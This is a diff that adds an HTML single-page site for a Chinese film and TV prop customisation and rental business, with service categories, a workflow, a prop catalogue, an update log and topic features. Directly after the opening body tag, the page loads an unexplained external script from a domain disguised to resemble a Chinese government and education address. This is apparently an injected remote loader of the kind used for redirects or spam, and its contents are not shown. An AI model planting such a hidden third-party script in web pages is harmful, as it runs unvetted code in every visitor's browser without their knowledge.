@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>影视道具｜专业影视道具定制与租赁服务｜影视道具 yingshidaoju-zh.github.io</title>
+<meta name="description" content="影视道具（yingshidaoju-zh.github.io）专注影视拍摄道具定制、古装与现代戏道具租赁、兵器盔甲复制及场景陈设，十余年剧组执行经验，支持全国发货与现场跟组，为电影、电视剧、网剧、短剧提供一站式道具解决方案。">
+<meta name="keywords" content="影视道具, yingshidaoju-zh.github.io, 影视道具定制, 古装影视道具, 影视道具租赁, 剧组道具, 影视兵器复制, 影视场景陈设, 短剧拍摄道具">
+<meta name="author" content="影视道具">
+<meta name="robots" content="index,follow">
+<meta name="bingbot" content="index,follow">
+<link rel="canonical" href="https://yingshidaoju-zh.github.io/">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",sans-serif;color:#2b2724;background:#f6f3ee;line-height:1.75;-webkit-font-smoothing:antialiased}
+a{text-decoration:none;color:#8a5a2b}
+.wrap{max-width:1180px;margin:0 auto;padding:0 24px}
+/* 顶部 */
+header{background:linear-gradient(135deg,#23201d 0%,#3d342c 55%,#5c4a36 100%);color:#f4ede3;padding:16px 0;position:sticky;top:0;z-index:99;border-bottom:3px solid #c9a227}
+.hd{display:flex;align-items:center;justify-content:space-between;gap:20px}
+.logo{font-size:22px;font-weight:800;letter-spacing:3px;color:#f4ede3}
+.logo b{color:#e3c158}
+.logo span{display:block;font-size:11px;letter-spacing:1px;color:#b9ac9a;font-weight:400;margin-top:2px}
+nav ul{display:flex;list-style:none;gap:8px;flex-wrap:wrap}
+nav a{color:#ddd3c6;font-size:14px;padding:8px 14px;border:1px solid transparent;border-radius:20px;transition:.25s;white-space:nowrap}
+nav a:hover{color:#fff;border-color:#c9a227;background:rgba(201,162,39,.15)}
+/* 首屏 */
+.hero{background:linear-gradient(rgba(20,17,14,.62),rgba(20,17,14,.62)),url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='60' height='60'%3E%3Cpath d='M0 30 L30 0 L60 30 L30 60 Z' fill='%23c9a227' fill-opacity='.06'/%3E%3C/svg%3E") repeat,linear-gradient(160deg,#2a241f,#4a3c2c);color:#f4ede3;padding:78px 0 66px;text-align:center}
+.hero h1{font-size:42px;letter-spacing:6px;margin-bottom:14px;text-shadow:0 2px 12px rgba(0,0,0,.5)}
+.hero h1 em{font-style:normal;color:#e3c158}
+.hero p{font-size:16px;color:#cfc4b4;max-width:660px;margin:0 auto 26px}
+.hero .url{display:inline-block;background:rgba(227,193,88,.14);border:1px dashed #c9a227;color:#f0e2bd;font-size:13px;padding:9px 20px;border-radius:6px;word-break:break-all;letter-spacing:.5px}
+.hero .url b{color:#fff}
+/* 通用区块 */
+section{padding:62px 0}
+.sec-h{text-align:center;margin-bottom:42px}
+.sec-h i{display:inline-block;width:34px;height:2px;background:#c9a227;vertical-align:middle;margin:0 12px}
+.sec-h h2{font-size:26px;letter-spacing:4px;display:inline;color:#332c24}
+.sec-h p{color:#7d7266;font-size:14px;margin-top:10px;letter-spacing:1px}
+/* 栏目导航卡 */
+.cats{display:grid;grid-template-columns:repeat(4,1fr);gap:18px}
+.cat{background:#fff;border-radius:10px;padding:30px 22px;text-align:center;border-top:4px solid #c9a227;box-shadow:0 4px 18px rgba(80,60,30,.08);transition:.3s}
+.cat:hover{transform:translateY(-6px)}
+.cat .n{width:56px;height:56px;line-height:56px;margin:0 auto 16px;border-radius:50%;background:#3d342c;color:#e3c158;font-size:24px;font-weight:700}
+.cat h3{font-size:18px;margin-bottom:10px;letter-spacing:2px}
+.cat p{font-size:13px;color:#7d7266}
+/* 服务流程 */
+.flow{background:#332c24;color:#e8dfd2}
+.flow .sec-h h2{color:#fff}
+.flow .sec-h p{color:#a89a86}
+.steps{display:grid;grid-template-columns:repeat(4,1fr);gap:0;position:relative}
+.step{text-align:center;padding:0 16px;position:relative}
+.step::after{content:"";position:absolute;top:34px;left:50%;width:100%;height:2px;background:rgba(201,162,39,.35)}
+.step:last-child::after{display:none}
+.step .num{width:70px;height:70px;line-height:70px;margin:0 auto 18px;border:2px solid #c9a227;border-radius:50%;font-size:26px;font-weight:800;color:#e3c158;background:#3d342c;position:relative;z-index:2}
+.step h4{font-size:16px;margin-bottom:8px;letter-spacing:1px}
+.step p{font-size:13px;color:#a89a86}
+/* 道具库 */
+.store{display:grid;grid-template-columns:repeat(3,1fr);gap:22px}
+.item{background:#fff;border-radius:10px;overflow:hidden;box-shadow:0 4px 14px rgba(80,60,30,.08)}
+.item .pic{height:150px;display:flex;align-items:center;justify-content:center;font-size:34px;color:rgba(255,255,255,.9)}
+.item .pic small{font-size:12px;letter-spacing:2px;display:block;margin-top:6px;opacity:.85}
+.item .body{padding:18px 20px}
+.item h4{font-size:16px;margin-bottom:8px;letter-spacing:1px}
+.item p{font-size:13px;color:#7d7266;margin-bottom:12px}
+.tags{display:flex;flex-wrap:wrap;gap:6px}
+.tags u{text-decoration:none;font-size:11px;color:#8a5a2b;background:#f6efe2;border:1px solid #e6d5b5;padding:3px 9px;border-radius:12px}
+/* 案例 */
+.case{background:#fff;border-radius:12px;padding:36px;box-shadow:0 4px 18px rgba(80,60,30,.08)}
+.case-q{display:grid;grid-template-columns:1.1fr .9fr;gap:34px;align-items:center}
+.case-q h3{font-size:22px;letter-spacing:2px;margin-bottom:16px;color:#332c24}
+.case-q h3 b{color:#a1762a}
+.case-q ul{list-style:none}
+.case-q li{padding:9px 0 9px 24px;position:relative;font-size:14px;color:#5c5348;border-bottom:1px dashed #e2d8c8}
+.case-q li::before{content:"❖";position:absolute;left:0;color:#c9a227;font-size:11px;top:11px}
+.stat{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}
+.stat div{background:#3d342c;color:#f4ede3;border-radius:8px;padding:20px 10px;text-align:center}
+.stat b{display:block;font-size:28px;color:#e3c158;letter-spacing:1px}
+.stat span{font-size:12px;color:#b9ac9a}
+/* 动态 */
+.news{display:grid;grid-template-columns:1fr 300px;gap:28px}
+.tb{border-collapse:collapse;width:100%;background:#fff;border-radius:10px;overflow:hidden;font-size:14px}
+.tb th{background:#3d342c;color:#e3c158;text-align:left;padding:13px 16px;font-weight:600;letter-spacing:1px}
+.tb td{padding:12px 16px;border-bottom:1px solid #f0e9de;color:#5c5348}
+.tb tr:nth-child(even) td{background:#faf7f2}
+.tb td b{color:#332c24}
+.stick{background:#fff;border-radius:10px;padding:22px;box-shadow:0 4px 14px rgba(80,60,30,.08)}
+.stick h4{font-size:15px;letter-spacing:2px;padding-bottom:12px;border-bottom:2px solid #c9a227;margin-bottom:14px}
+.stick ol{list-style:none;counter-reset:s}
+.stick li{counter-increment:s;padding:9px 0 9px 30px;position:relative;font-size:13px;color:#5c5348;border-bottom:1px dotted #e6dccb}
+.stick li::before{content:counter(s);position:absolute;left:0;top:9px;width:20px;height:20px;line-height:20px;text-align:center;background:#c9a227;color:#fff;border-radius:4px;font-size:11px}
+/* 专题 */
+.topics{display:grid;grid-template-columns:1.4fr 1fr;gap:22px}
+.tp{background:#fff;border-radius:10px;overflow:hidden;box-shadow:0 4px 14px rgba(80,60,30,.08)}
+.tp.big{grid-row:span 2}
+.tp .cover{height:180px;display:flex;flex-direction:column;justify-content:flex-end;padding:20px;color:#fff}
+.tp.big .cover{height:100%}
+.tp .cover b{font-size:20px;letter-spacing:2px;text-shadow:0 2px 6px rgba(0,0,0,.5)}
+.tp .cover span{font-size:12px;opacity:.9;margin-top:6px}
+.tp .txt{padding:18px 20px;font-size:13px;color:#6b6155}
+.tp .txt a{display:inline-block;margin-top:10px;font-size:12px;color:#8a5a2b;border-bottom:1px solid #c9a227;padding-bottom:2px}
+/* 关于 */
+.about{background:linear-gradient(135deg,#2a241f,#463a2b);color:#e8dfd2}
+.ab{display:grid;grid-template-columns:1.2fr .8fr;gap:40px;align-items:center}
+.ab p{font-size:15px;color:#c9b9a4;margin-bottom:14px}
+.ab .box{background:rgba(227,193,88,.1);border:1px solid rgba(201,162,39,.45);border-radius:10px;padding:26px}
+.ab .box h4{font-size:16px;letter-spacing:3px;color:#e3c158;margin-bottom:16px}
+.ab .box p{font-size:14px;color:#ddd0bd;margin:0;line-height:2.1}
+.ab .box p b{color:#fff;font-weight:600}
+/* 页脚 */
+footer{background:#1c1916;color:#9a8c78;padding:38px 0 26px;text-align:center;font-size:13px}
+footer .ln{color:#e3c158;font-size:15px;letter-spacing:1px;word-break:break-all;margin:8px 0 14px}
+footer .ln b{color:#fff}
+footer .ft{display:flex;justify-content:center;gap:20px;flex-wrap:wrap;margin-bottom:16px}
+footer .ft a{color:#9a8c78;font-size:13px}
+footer .ft a:hover{color:#e3c158}
+/* 响应式 */
+@media(max-width:900px){
+ .cats,.steps,.store{grid-template-columns:repeat(2,1fr)}
+ .news,.topics,.case-q,.ab{grid-template-columns:1fr;gap:22px}
+ .step::after{display:none}
+ .tp.big{grid-row:auto}.tp.big .cover{height:180px}
+}
+@media(max-width:640px){
+ header{padding:12px 0}
+ .hd{flex-direction:column;gap:12px}
+ nav ul{justify-content:center}
+ .logo{text-align:center}
+ .hero{padding:50px 0 42px}
+ .hero h1{font-size:27px;letter-spacing:3px}
+ .cats,.steps,.store,.stat{grid-template-columns:1fr}
+ section{padding:44px 0}
+ .sec-h h2{font-size:21px}
+ .case{padding:22px 18px}
+ .tb{font-size:13px}
+ .tb th,.tb td{padding:10px}
+ footer .ft{gap:10px 14px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header>
+  <div class="wrap hd">
+    <div class="logo"><b>影视道具</b><span>yingshidaoju-zh.github.io</span></div>
+    <nav><ul>
+      <li><a href="#cats">频道栏目</a></li>
+      <li><a href="#store">道具资料库</a></li>
+      <li><a href="#news">动态与维护</a></li>
+      <li><a href="#topics">专题策划</a></li>
+      <li><a href="#about">关于本站</a></li>
+    </ul></nav>
+  </div>
+</header>
+
+<section class="hero">
+  <div class="wrap">
+    <h1><em>影视道具</em>· 让每一场戏都立得住</h1>
+    <p>从剧本读解、道具清单拆分到实物打样、现场跟组，影视道具（yingshidaoju-zh.github.io）为剧组提供全流程道具执行服务，古装、年代、现代、科幻多类型经验覆盖。</p>
+    <div class="url">官方网址：<b>https://yingshidaoju-zh.github.io</b></div>
+  </div>
+</section>
+
+<section id="cats">
+  <div class="wrap">
+    <div class="sec-h"><i></i><h2>频道栏目</h2><i></i><p>影视道具 五大服务板块，按拍摄环节拆分</p></div>
+    <div class="cats">
+      <div class="cat"><div class="n">壹</div><h3>道具定制</h3><p>按剧本需求一对一打样，材质、做旧、刻字均可指定，支持小批量与单件生产。</p></div>
+      <div class="cat"><div class="n">贰</div><h3>道具租赁</h3><p>万件库存现货调用，按场次计费，含运输、摆放与现场维护人员。</p></div>
+      <div class="cat"><div class="n">叁</div><h3>兵器盔甲</h3><p>影视级冷兵器、铠甲与仪仗复制，注重形制考据与安全合规处理。</p></div>
+      <div class="cat"><div class="n">肆</div><h3>场景陈设</h3><p>室内外场景软装与陈设道具包，快速成型，按平米与场次报价。</p></div>
+    </div>
+  </div>
+</section>
+
+<section class="flow">
+  <div class="wrap">
+    <div class="sec-h"><i></i><h2>执行流程</h2><i></i><p>从接单到杀青，四个节点可控可查</p></div>
+    <div class="steps">
+      <div class="step"><div class="num">01</div><h4>剧本拆解</h4><p>通读剧本与分镜，输出道具总清单、材质建议与预算区间。</p></div>
+      <div class="step"><div class="num">02</div><h4>方案报价</h4><p>按场次、数量、工艺分级报价，确认打样周期与交件节点。</p></div>
+      <div class="step"><div class="num">03</div><h4>制作打样</h4><p>实物打样确认后再批量生产，过程中同步拍摄进度调整。</p></div>
+      <div class="step"><div class="num">04</div><h4>现场执行</h4><p>跟组摆放、补损替换与杀青回收，全程留档便于复用。</p></div>
+    </div>
+  </div>
+</section>
+
+<section id="store">
+  <div class="wrap">
+    <div class="sec-h"><i></i><h2>道具资料库</h2><i></i><p>影视道具 yingshidaoju-zh.github.io 常备品类速览</p></div>
+    <div class="store">
+      <div class="item">
+        <div class="pic" style="background:linear-gradient(135deg,#5c4a36,#3d342c)">⚔<small>古装兵器</small></div>
+        <div class="body"><h4>古装兵器与仪仗</h4><p>刀枪剑戟、弓弩盾牌、将军令旗与仪仗用具，形制参照历代图录。</p><div class="tags"><u>汉唐</u><u>明清</u><u>仙侠</u></div></div>
+      </div>
+      <div class="item">
+        <div class="pic" style="background:linear-gradient(135deg,#7a3b2e,#4a241c)">🏺<small>生活器皿</small></div>
+        <div class="body"><h4>生活器皿与陈设</h4><p>陶瓷漆器、铜锡器皿、灯具烛台、文房与市井摊位道具。</p><div class="tags"><u>做旧</u><u>仿古</u><u>批量</u></div></div>
+      </div>
+      <div class="item">
+        <div class="pic" style="background:linear-gradient(135deg,#2f4a4a,#1d3333)">📻<small>年代物件</small></div>
+        <div class="body"><h4>年代戏与现代道具</h4><p>七八十年代家电、老式电话、报刊杂志、票据与办公陈设。</p><div class="tags"><u>年代剧</u><u>怀旧</u><u>现货</u></div></div>
+      </div>
+      <div class="item">
+        <div class="pic" style="background:linear-gradient(135deg,#4a3c5c,#2c2238)">📖<small>文书档案</small></div>
+        <div class="body"><h4>文书档案与信件</h4><p>圣旨、地契、书信、档案卷宗与手写批件，含排版与做旧工艺。</p><div class="tags"><u>定制</u><u>书法</u><u>印章</u></div></div>
+      </div>
+      <div class="item">
+        <div class="pic" style="background:linear-gradient(135deg,#6b5524,#3d3014)">👑<small>冠冕服饰</small></div>
+        <div class="body"><h4>冠冕配饰与腰佩</h4><p>冠帽、腰带、玉佩、朝珠与首饰配件，兼顾佩戴舒适度。</p><div class="tags"><u>考据</u><u>轻量化</u><u>租赁</u></div></div>
+      </div>
+      <div class="item">
+        <div class="pic" style="background:linear-gradient(135deg,#3d4a2c,#26331a)">🧪<small>特殊道具</small></div>
+        <div class="body"><h4>特殊效果道具</h4><p>易碎、燃烧、食物替代与机关类道具，按安全规范制作。</p><div class="tags"><u>安全</u><u>一次性</u><u>特效</u></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="news">
+  <div class="wrap">
+    <div class="sec-h"><i></i><h2>更新与维护动态</h2><i></i><p>影视道具 站点内容与库存同步记录</p></div>
+    <div class="news">
+      <table class="tb">
+        <thead><tr><th style="width:110px">日期</th><th>更新内容</th><th style="width:90px">状态</th></tr></thead>
+        <tbody>
+          <tr><td><b>10-21</b></td><td>新增「宋代文人书房」陈设道具包，含文房、香器、挂画共 86 件</td><td>已上线</td></tr>
+          <tr><td><b>10-15</b></td><td>古装兵器库扩充唐代制式刀剑 24 款，支持实物打样确认</td><td>已上线</td></tr>
+          <tr><td><b>10-08</b></td><td>站点栏目结构调整为五大板块，补充执行流程与报价说明</td><td>已完成</td></tr>
+          <tr><td><b>09-28</b></td><td>年代戏道具清单更新：八九十年代家电与票据类库存盘点</td><td>已完成</td></tr>
+          <tr><td><b>09-19</b></td><td>修复部分道具图片加载异常，优化移动端栏目导航体验</td><td>已修复</td></tr>
+        </tbody>
+      </table>
+      <div class="stick">
+        <h4>剧组常问</h4>
+        <ol>
+          <li>单件定制最快几天能出样？</li>
+          <li>租赁道具如何计算场次费用？</li>
+          <li>异地拍摄能否全国发货？</li>
+          <li>特殊效果道具的安全标准？</li>
+          <li>杀青后道具如何处理？</li>
+        </ol>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="topics">
+  <div class="wrap">
+    <div class="sec-h"><i></i><h2>精选专题策划</h2><i></i><p>影视道具 yingshidaoju-zh.github.io 按题材整理的道具思路</p></div>
+    <div class="topics">
+      <div class="tp big">
+        <div class="cover" style="background:linear-gradient(rgba(20,17,14,.35),rgba(20,17,14,.75)),linear-gradient(135deg,#5c4a36,#2c241c)"><b>古装剧道具考据要点</b><span>形制 · 材质 · 做旧三层把关</span></div>
+        <div class="txt">古装戏最容易出戏的往往是细节：带钩的形制、腰带的结法、器物的纹样年代。专题按朝代整理常见错误清单，并给出可落地的替代方案，帮美术与道具组在前期就对表。<a href="#">查看考据清单 →</a></div>
+      </div>
+      <div class="tp">
+        <div class="cover" style="background:linear-gradient(rgba(20,17,14,.3),rgba(20,17,14,.7)),linear-gradient(135deg,#7a3b2e,#3d241c)"><b>小成本短剧道具省钱法</b><span>一物多用与复用技巧</span></div>
+        <div class="txt">短剧周期紧、预算薄，靠的是道具复用与快速替换方案。专题整理可复用的陈设包与省钱排期思路。<a href="#">查看方案 →</a></div>
+      </div>
+      <div class="tp">
+        <div class="cover" style="background:linear-gradient(rgba(20,17,14,.3),rgba(20,17,14,.7)),linear-gradient(135deg,#2f4a4a,#1d3333)"><b>年代戏场景陈设速成</b><span>七八十年代生活质感</span></div>
+        <div class="txt">从墙面张贴到桌面杂物，用少量高辨识度物件快速建立年代感，附常用物件清单。<a href="#">查看清单 →</a></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="about" class="about">
+  <div class="wrap">
+    <div class="sec-h"><i></i><h2 style="color:#fff">关于影视道具</h2><i></i><p style="color:#a89a86">yingshidaoju-zh.github.io 的官方说明</p></div>
+    <div class="ab">
+      <div>
+        <p>影视道具（<b style="color:#e3c158">yingshidaoju-zh.github.io</b>）是一个专注于影视拍摄道具定制与租赁服务的单页站点，内容围绕道具品类、执行流程、库存动态与专题策划展开，供剧组美术、道具师与制片方参考对接。</p>
+        <p>站点坚持「先对表、再打样、后批量」的执行顺序，所有定制件均以剧本与分镜为依据，不做脱离剧情的堆砌；租赁件按场次与损耗分级计价，异地拍摄支持全国发货与现场跟组。</p>
+        <p>如需按具体剧本获取道具清单与报价，可通过本页栏目入口提交需求，通常在一个工作日内回复初步方案。</p>
+      </div>
+      <div class="box">
+        <h4>官方信息</h4>
+        <p>网站名称：<b>影视道具</b><br>官方网址：<b>https://yingshidaoju-zh.github.io</b><br>服务范围：电影 / 电视剧 / 网剧 / 短剧<br>主营方向：定制 · 租赁 · 陈设 · 跟组</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div class="ft">
+      <a href="#cats">频道栏目</a>
+      <a href="#store">道具资料库</a>
+      <a href="#news">动态与维护</a>
+      <a href="#topics">专题策划</a>
+      <a href="#about">关于本站</a>
+    </div>
+    <div class="ln">影视道具 官方网址：<b>https://yingshidaoju-zh.github.io</b></div>
+    <p>© 影视道具 yingshidaoju-zh.github.io ｜ 本页为单页站点，栏目内链以 # 锚点跳转</p>
+  </div>
+</footer>
+
+</body>
+</html>
